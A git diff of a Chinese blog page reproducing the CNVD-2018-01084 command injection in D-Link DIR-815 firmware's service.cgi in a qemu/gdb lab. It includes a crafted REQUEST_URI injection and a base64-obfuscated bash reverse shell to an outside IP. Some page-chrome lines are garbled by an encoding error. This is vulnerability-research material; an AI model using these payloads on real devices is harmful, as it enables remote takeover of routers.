@@ -14,10 +14,10 @@
 
   
 
-  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_0khxww3tj3q9';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":100,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://Khighl.github.io.git';</script>
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_0khxww3tj3q9';window.REIMU_CONFIG.clipboard_tips = {"success":"澶嶅埗鎴愬姛(*^鈻絕*)","fail":"澶嶅埗澶辫触 (锞熲娍锞?锞?","copyright":{"enable":false,"count":100,"content":"鏈枃鐗堟潈锛氭湰鍗氬鎵€鏈夋枃绔犻櫎鐗瑰埆澹版槑澶栵紝鍧囬噰鐢?BY-NC-SA 璁稿彲鍗忚銆傝浆杞借娉ㄦ槑鍑哄锛?"}};window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://Khighl.github.io.git';</script>
   
   <title>
-    CNVD-2018-01084 |
+    CNVD-2018-01084 命令注入漏洞 |
     
     Hexo
   </title>
@@ -37,7 +37,7 @@
   
     <meta name="description" content="CNVD-2018-01084 命令注入漏洞复现| 0 | 前言第一次摸到命令注入漏洞,和CNVD-2013-11625有着相似的模式,过程非常轻松,已经学会了一点点逆向偷跑的小技巧 全程看着winmt大哥的记录复现的 官方报告: D-Link DIR 615&#x2F;645&#x2F;815 service.cgi远程命令执行漏洞 固件获取: 固件下载 | 1 | 前期准备仍然使用binwla">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CNVD-2018-01084">
+<meta property="og:title" content="CNVD-2018-01084 命令注入漏洞">
 <meta property="og:url" content="https://khighl.github.io.git/2025/06/16/CNVD-2018-01084%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="CNVD-2018-01084 命令注入漏洞复现| 0 | 前言第一次摸到命令注入漏洞,和CNVD-2013-11625有着相似的模式,过程非常轻松,已经学会了一点点逆向偷跑的小技巧 全程看着winmt大哥的记录复现的 官方报告: D-Link DIR 615&#x2F;645&#x2F;815 service.cgi远程命令执行漏洞 固件获取: 固件下载 | 1 | 前期准备仍然使用binwla">
@@ -57,10 +57,8 @@
 <meta property="og:image" content="https://khighl.github.io.git/images/CNVD-2018-01084%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1750040955496.png">
 <meta property="og:image" content="https://khighl.github.io.git/images/CNVD-2018-01084%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1750041407205.png">
 <meta property="article:published_time" content="2025-06-15T16:00:00.000Z">
-<meta property="article:modified_time" content="2025-06-16T02:39:21.112Z">
+<meta property="article:modified_time" content="2026-03-24T01:55:12.647Z">
 <meta property="article:author" content="zer00ne">
-<meta property="article:tag" content="安全">
-<meta property="article:tag" content="iot漏洞复现">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://khighl.github.io.git/images/CNVD-2018-01084%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1750038811468.png">
   
@@ -107,7 +105,7 @@
           </svg>
         
       </div>
-      <div class="loading-word">少女祈祷中...</div>
+      <div class="loading-word">灏戝コ绁堢シ涓?..</div>
     </div>
   </div>
   </div>
@@ -194,7 +192,7 @@
           
         </picture>
         
-          <img  fetchpriority="high" src="/images/banner.webp" alt="CNVD-2018-01084">
+          <img  fetchpriority="high" src="/images/banner.webp" alt="CNVD-2018-01084 命令注入漏洞">
         
       
     
@@ -205,7 +203,7 @@
         
         
           <a href="/" id="logo">
-            <h1 data-aos="slide-up">CNVD-2018-01084</h1>
+            <h1 data-aos="slide-up">CNVD-2018-01084 命令注入漏洞</h1>
           </a>
         
       
@@ -245,15 +243,15 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">24</div>
+    <div class="sidebar-state-number">25</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
-    <div class="sidebar-state-number">0</div>
+    <div class="sidebar-state-number">2</div>
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">9</div>
+    <div class="sidebar-state-number">0</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -322,11 +320,15 @@
       <div class="article-date">
   <span class="article-date-link" data-aos="zoom-in">
     <time datetime="2025-06-15T16:00:00.000Z" itemprop="datePublished">2025-06-16</time>
-    <time style="display: none;" id="post-update-time">2025-06-16</time>
+    <time style="display: none;" id="post-update-time">2026-03-24</time>
   </span>
 </div>
 
       
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/" data-aos="zoom-in">cve复现</a>
+  </div>
+
 
     </div>
     <div class="hr-line"></div>
@@ -335,56 +337,56 @@
     <div class="e-content article-entry" itemprop="articleBody">
       
       
-        <h1 id="CNVD-2018-01084-命令注入漏洞复现"><a href="#CNVD-2018-01084-命令注入漏洞复现" class="headerlink" title="CNVD-2018-01084 命令注入漏洞复现"></a>CNVD-2018-01084 命令注入漏洞复现</h1><h2 id="0-前言"><a href="#0-前言" class="headerlink" title="| 0 | 前言"></a>| 0 | 前言</h2><p>第一次摸到命令注入漏洞,和<code>CNVD-2013-11625</code>有着相似的模式,过程非常轻松,已经学会了一点点逆向偷跑的小技巧</p>
+        <h1 id="CNVD-2018-01084-命令注入漏洞复现"><a href="#CNVD-2018-01084-命令注入漏洞复现" class="headerlink" title="CNVD-2018-01084 命令注入漏洞复现"></a>CNVD-2018-01084 命令注入漏洞复现</h1><h2 id="0-前言"><a href="#0-前言" class="headerlink" title="| 0 | 前言"></a>| 0 | 前言</h2><p>第一次摸到命令注入漏洞,和CNVD-2013-11625有着相似的模式,过程非常轻松,已经学会了一点点逆向偷跑的小技巧</p>
 <p>全程看着winmt大哥的记录复现的</p>
-<p>官方报告: <a target="_blank" rel="noopener" href="https://www.cnvd.org.cn/flaw/show/CNVD-2018-01084" title="D-Link DIR 615&#x2F;645&#x2F;815 service.cgi远程命令执行漏洞">D-Link DIR 615&#x2F;645&#x2F;815 service.cgi远程命令执行漏洞</a></p>
+<p>官方报告: <a target="_blank" rel="noopener" href="https://www.cnvd.org.cn/flaw/show/CNVD-2018-01084">D-Link DIR 615&#x2F;645&#x2F;815 service.cgi远程命令执行漏洞</a></p>
 <p>固件获取: <a target="_blank" rel="noopener" href="https://legacyfiles.us.dlink.com/DIR-815/REVA/FIRMWARE/">固件下载</a></p>
-<h2 id="1-前期准备"><a href="#1-前期准备" class="headerlink" title="| 1 | 前期准备"></a>| 1 | 前期准备</h2><p>仍然使用<code>binwlak</code>解包,目前还没遇到过加密的固件包,不过估计快了</p>
+<h2 id="1-前期准备"><a href="#1-前期准备" class="headerlink" title="| 1 | 前期准备"></a>| 1 | 前期准备</h2><p>仍然使用binwlak解包,目前还没遇到过加密的固件包,不过估计快了</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e --preserve-symlinks DIR-815\ FW\ 1.01b14_1.01b14.bin</span><br></pre></td></tr></table></figure>
 
 <p><img src="/images/CNVD-2018-01084%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1750038811468.png" alt="1750038811468"></p>
 <h2 id="2-文件逆向"><a href="#2-文件逆向" class="headerlink" title="| 2 | 文件逆向"></a>| 2 | 文件逆向</h2><p><img src="/images/CNVD-2018-01084%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1750038934494.png" alt="1750038934494"></p>
-<p>进入<code>main</code>函数,仍然是根据<code>argv</code>进入不同的函数对报文进行处理,根据官方漏洞报告,找到<code>servicecgi_main</code></p>
-<p>请求处理如下,当请求方式为<code>POST</code>或<code>GET</code>时,程序不会报错,且<code>POST</code>时<code>v2=0x400</code>;<code>GET</code>时<code>v2=0x40</code><img src="/images/CNVD-2018-01084%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1750039126448.png" alt="1750039126448"></p>
-<p>处理完请求方式后,进入<code>cgibin_parse_request((int)sub_40A63C, 0, v2)</code>,这个函数我已经在<code>CNVD-2013-11625</code>复现中实现了</p>
+<p>进入main函数,仍然是根据argv进入不同的函数对报文进行处理,根据官方漏洞报告,找到servicecgi_main</p>
+<p>请求处理如下,当请求方式为POST或GET时,程序不会报错,且POST时v2&#x3D;0x400;GET时v2&#x3D;0x40<img src="/images/CNVD-2018-01084%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1750039126448.png" alt="1750039126448"></p>
+<p>处理完请求方式后,进入cgibin_parse_request((int)sub_40A63C, 0, v2),这个函数我已经在CNVD-2013-11625复现中实现了</p>
 <p><img src="/images/CNVD-2018-01084%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1750039400328.png" alt="1750039400328"></p>
-<p>先对<code>URI</code>变量使用<code>?</code>分割,然后将后半段使用<code>=</code>与<code>&amp;</code>继续分割</p>
+<p>先对URI变量使用?分割,然后将后半段使用&#x3D;与&amp;继续分割</p>
 <p><img src="/images/CNVD-2018-01084%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1750039441853.png" alt="1750039441853"></p>
 <p>最后数据被存储在堆中,堆指针被留在栈上(这是个重点)</p>
 <p><img src="/images/CNVD-2018-01084%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1750039521609.png" alt="1750039521609"></p>
-<p>然后调用<code>sub_40A1C0</code>,以硬编码的字符串为参数,在这里可以猜测是对刚刚处理好的<code>URI</code>进行比较</p>
+<p>然后调用sub_40A1C0,以硬编码的字符串为参数,在这里可以猜测是对刚刚处理好的URI进行比较</p>
 <p>但具体比较的是哪段很难通过静态分析看出来</p>
 <p><img src="/images/CNVD-2018-01084%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1750039624082.png" alt="1750039624082"></p>
-<p>然后根据<code>URI</code>的不同,将<code>v12</code>赋值为不同的格式化字符串,最后调用<code>lxmldbc_system</code></p>
+<p>然后根据URI的不同,将v12赋值为不同的格式化字符串,最后调用lxmldbc_system</p>
 <p><img src="/images/CNVD-2018-01084%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1750039700927.png" alt="1750039700927"></p>
-<p>很明显的<code>漏洞注入</code>,没有任何参数的过滤(除了<code>&amp;</code>因为分割原因被过滤)</p>
-<p>现在的问题是<code>lxmldbc_system</code>的参数我们不好观察(使用的栈上的数据,但是栈具体是什么样子我们不好看出来)</p>
-<p>这时候就要使用<code>动态调试</code>了</p>
-<h2 id="3-动态调试"><a href="#3-动态调试" class="headerlink" title="| 3 | 动态调试"></a>| 3 | 动态调试</h2><p>运行以下<code>shell</code>脚本</p>
+<p>很明显的漏洞注入,没有任何参数的过滤(除了&amp;因为分割原因被过滤)</p>
+<p>现在的问题是lxmldbc_system的参数我们不好观察(使用的栈上的数据,但是栈具体是什么样子我们不好看出来)</p>
+<p>这时候就要使用动态调试了</p>
+<h2 id="3-动态调试"><a href="#3-动态调试" class="headerlink" title="| 3 | 动态调试"></a>| 3 | 动态调试</h2><p>运行以下shell脚本</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">/bin/sh</span></span><br><span class="line">INPUT=&quot;0000000000&quot;</span><br><span class="line">echo $INPUT | qemu-mipsel -L . \</span><br><span class="line">    -g 1234 \</span><br><span class="line">    -0 &quot;service.cgi&quot; \</span><br><span class="line">    -E REQUEST_URI=&quot;aaa?bbb;ccc&quot; \</span><br><span class="line">    -E REQUEST_METHOD=&quot;POST&quot; \</span><br><span class="line">    -E CONTENT_LENGTH=10 \</span><br><span class="line">    -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \</span><br><span class="line">    ./htdocs/cgibin</span><br></pre></td></tr></table></figure>
 
-<p>然后在另一个<code>shell</code>中使用<code>gdb</code>连接<code>1234</code>端口</p>
-<h3 id="分析sub-40A1C0的功能"><a href="#分析sub-40A1C0的功能" class="headerlink" title="分析sub_40A1C0的功能"></a>分析<code>sub_40A1C0</code>的功能</h3><p>我们将断点打在<code>strcmp</code>函数上,观察哪部分<code>URI</code>被用来和硬编码的字符串进行比较</p>
+<p>然后在另一个shell中使用gdb连接1234端口</p>
+<h3 id="分析sub-40A1C0的功能"><a href="#分析sub-40A1C0的功能" class="headerlink" title="分析sub_40A1C0的功能"></a>分析sub_40A1C0的功能</h3><p>我们将断点打在strcmp函数上,观察哪部分URI被用来和硬编码的字符串进行比较</p>
 <p><img src="/images/CNVD-2018-01084%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1750040218492.png" alt="1750040218492"></p>
-<p>可以看到,bbb段被用来和<code>EVENT</code>进行比较,确定由<code>?</code>和<code>=</code>中间的字段决定格式化字符串的模式</p>
-<p>我们将脚本中的<code>URI</code>变量修改为<code>aaa?EVENT=ccc</code></p>
-<h3 id="对lxmldbc-system参数的调试"><a href="#对lxmldbc-system参数的调试" class="headerlink" title="对lxmldbc_system参数的调试"></a>对<code>lxmldbc_system</code>参数的调试</h3><p>我们同样将断点下在<code>lxmldbc_system</code>上,观察参数</p>
+<p>可以看到,bbb段被用来和EVENT进行比较,确定由?和&#x3D;中间的字段决定格式化字符串的模式</p>
+<p>我们将脚本中的URI变量修改为aaa?EVENT&#x3D;ccc</p>
+<h3 id="对lxmldbc-system参数的调试"><a href="#对lxmldbc-system参数的调试" class="headerlink" title="对lxmldbc_system参数的调试"></a>对lxmldbc_system参数的调试</h3><p>我们同样将断点下在lxmldbc_system上,观察参数</p>
 <p><img src="/images/CNVD-2018-01084%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1750040448948.png" alt="1750040448948"></p>
-<p>可以看到<code>ccc</code>被格式化进入了字符串</p>
-<p>最后把断点下在<code>system</code>函数上,最终确定命令是可控的</p>
+<p>可以看到ccc被格式化进入了字符串</p>
+<p>最后把断点下在system函数上,最终确定命令是可控的</p>
 <p><img src="/images/CNVD-2018-01084%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1750040624056.png" alt="1750040624056"></p>
 <h2 id="命令注入分析"><a href="#命令注入分析" class="headerlink" title="命令注入分析"></a>命令注入分析</h2><p>我们可以使用多种分割符号对system命令进行分割,这样可以处理掉无意义的字符串</p>
-<p>最简单的分隔符就是<code>;</code></p>
-<p>此时我们将<code>URI</code>设置为<code>-E REQUEST_URI=&quot;aaa?EVENT=;echo hacking!!!;&quot; \</code></p>
+<p>最简单的分隔符就是;</p>
+<p>此时我们将URI设置为-E REQUEST_URI&#x3D;”aaa?EVENT&#x3D;;echo hacking!!!;” \</p>
 <p>再次调试,在system处发现</p>
 <p><img src="/images/CNVD-2018-01084%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1750040921155.png" alt="1750040921155"></p>
 <p>可以看到屏幕上成功被打印出</p>
 <p><img src="/images/CNVD-2018-01084%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1750040955496.png" alt="1750040955496"></p>
 <p>说明我们命令注入成功!</p>
-<p>当然如果想扩大利用,我们可以<code>弹一个shell</code>到其他端口</p>
-<p>因为<code>&amp;</code>被过滤了,我们可以通过<code>base64</code>加密解密+<code>|</code>使用来间接注入反弹<code>shell</code>命令</p>
-<p>将<code>URI</code>修改为<code>-E REQUEST_URI=&quot;aaa?EVENT=;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTcuNjguMTAuOTYvMzY4ODEgMD4mMQ== | base64 -d | /bin/bash;&quot;</code></p>
-<p>将<code>base64</code>编码的<code>反弹shell</code>命令进行<code>base64解密</code>,再通过传入<code>/bin/bash</code>执行,成功弹出<code>shell</code></p>
+<p>当然如果想扩大利用,我们可以弹一个shell到其他端口</p>
+<p>因为&amp;被过滤了,我们可以通过base64加密解密+|使用来间接注入反弹shell命令</p>
+<p>将URI修改为-E REQUEST_URI&#x3D;”aaa?EVENT&#x3D;;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTcuNjguMTAuOTYvMzY4ODEgMD4mMQ&#x3D;&#x3D; | base64 -d | &#x2F;bin&#x2F;bash;”</p>
+<p>将base64编码的反弹shell命令进行base64解密,再通过传入&#x2F;bin&#x2F;bash执行,成功弹出shell</p>
 <p><img src="/images/CNVD-2018-01084%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1750041407205.png" alt="1750041407205"></p>
 
       
@@ -399,8 +401,6 @@
       
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/iot%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">iot漏洞复现</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li></ul>
-
 
     </footer>
   </div>
@@ -412,14 +412,14 @@
         
           
           
-            <img data-src="/covers/erj.jpg" data-sizes="auto" alt="r树的秘密" class="lazyload">
+            <img data-src="/covers/er.jpg" data-sizes="auto" alt="fuzz" class="lazyload">
           
         
         <a href="/2025/06/28/fuzz/"></a>
         <div class="article-nav-caption">前一篇</div>
         <h3 class="article-nav-title">
           
-            r树的秘密
+            fuzz
           
         </h3>
       </div>
@@ -430,14 +430,14 @@
       
         
         
-          <img data-src="/covers/as.jpg" data-sizes="auto" alt="only_read的三种解法" class="lazyload">
+          <img data-src="/covers/erj.jpg" data-sizes="auto" alt="ACTF 2025" class="lazyload">
         
       
       <a href="/2025/06/13/ACTF%202025/"></a>
       <div class="article-nav-caption">后一篇</div>
       <h3 class="article-nav-title">
         
-          only_read的三种解法
+          ACTF 2025
         
       </h3>
     </div>
@@ -483,10 +483,10 @@
     
       <div>
         <span class="icon-brush"></span>
-        74.8k
+        71.3k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        05:57
+        05:34
       </div>
     
     
@@ -532,15 +532,15 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">24</div>
+    <div class="sidebar-state-number">25</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
-    <div class="sidebar-state-number">0</div>
+    <div class="sidebar-state-number">2</div>
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">9</div>
+    <div class="sidebar-state-number">0</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -677,13 +677,13 @@
       <script data-pjax>
         window.REIMU_POST = {
           author: "zer00ne",
-          title: "CNVD-2018-01084",
+          title: "CNVD-2018-01084 命令注入漏洞",
           url: "https://khighl.github.io.git/2025/06/16/CNVD-2018-01084%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/",
           excerpt: "",
           description: "",
           stripContent: "CNVD-2018-01084 命令注入漏洞复现| 0 | 前言第一次摸到命令注入漏洞,和CNVD-2013-11625有着相似的模式,过程非常轻松,已经学会了一点点逆向偷跑的小技巧 全程看着winmt大哥的记录复现的 官方报告: D-Link DIR 615&amp;#x2F;645&amp;#x2F;815 service.cgi远程命令执行漏洞 固件获取: 固件下载 | 1 | 前期准备仍然使用binwlak解包,目前还没遇到过加密的固件包,不过估计快了 1binwalk -e --preserve-sy",
           date: "Mon Jun 16 2025 00:00:00 GMT+0800",
-          updated: "Mon Jun 16 2025 10:39:21 GMT+0800",
+          updated: "Tue Mar 24 2026 09:55:12 GMT+0800",
           cover: "/images/banner.webp",
         };
       </script>
